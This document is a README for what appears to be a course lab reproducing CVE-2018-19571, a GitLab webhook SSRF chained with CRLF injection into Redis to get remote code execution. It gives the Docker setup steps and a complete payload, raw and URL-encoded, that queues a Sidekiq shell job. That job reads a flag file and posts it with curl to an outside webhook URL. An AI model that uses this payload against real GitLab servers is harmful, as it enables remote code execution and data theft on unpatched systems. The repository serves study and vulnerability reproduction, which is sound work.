# GitLab SSRF

This repository is a reproduction of [CVE-2018-19571](https://nvd.nist.gov/vuln/detail/CVE-2018-19571), and how when combined with a CRLF injection exploit, can lead to remote code execution (RCE).

## CVE Details

### CVE-2018-19571

GitLab CE/EE, versions 8.18 up to 11.x before 11.3.11, 11.4 before 11.4.8, and 11.5 before 11.5.1, are vulnerable to an SSRF vulnerability in webhooks.

## Setting Up

For this reproduction, we will be using a vulnerable GitLab image, and running it using Docker Compose.

```sh
git clone https://github.com/CS4239-U6/gitlab-ssrf.git
cd gitlab-ssrf
docker-compose up
```

The goal is to provide a webhook URL that, when processed, would result in a payload being sent to Redis.

This payload, that will be enqueued, will contain a Sidekiq Job, which upon execution will run arbitrary shell code. In our case, it will copy over the flag value to us.

## Steps

We will first run through the steps, before explaining what each of these steps do.

1. Create an account, or login using the root account.

   The root password should be `password`, as specified in the file `initial_root_password`, but sometimes this doesn't end up loading properly.

   In such cases, you will need to modify the root account password directly.

   ```sh
   docker exec -it gitlab-ssrf_web_1 /bin/bash
   # Inside the shell
   gitlab-rails console
   # Inside the console
   user = User.find_by_username 'root'
   user.password = 'password'
   user.password_confirmation = 'password'
   user.save!
   ```

   Then, head over to `http://localhost:5080` and login.

2. Navigate to the create project page.

   Next, head over to `http://localhost:5080/projects/new` and click the tab `Import project`. You should see that there is an option: `Repo by URL`. We are going to use that to perform our SSRF attack.

3. Create a webhook to receive the flag.

Create a webhook URL at `https://webhook.site/`.

Paste the URL into the following code at `<URL HERE>`:

```text
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|cat /flag | curl -H "Content-Type: application/json" -X POST --data-binary @- <URL HERE>\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
/ssrf.git
```

Then finally, we encode the above using a [URL Encoded](https://meyerweb.com/eric/tools/dencoder/).

```text
git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2F%0A%20multi%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open(%5C%27%7Ccat%20%2Fflag%20%7C%20curl%20-H%20%22Content-Type%3A%20application%2Fjson%22%20-X%20POST%20--data-binary%20%40-%20%3CURL%20HERE%3E%5C%27).read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A%2Fssrf.git
```
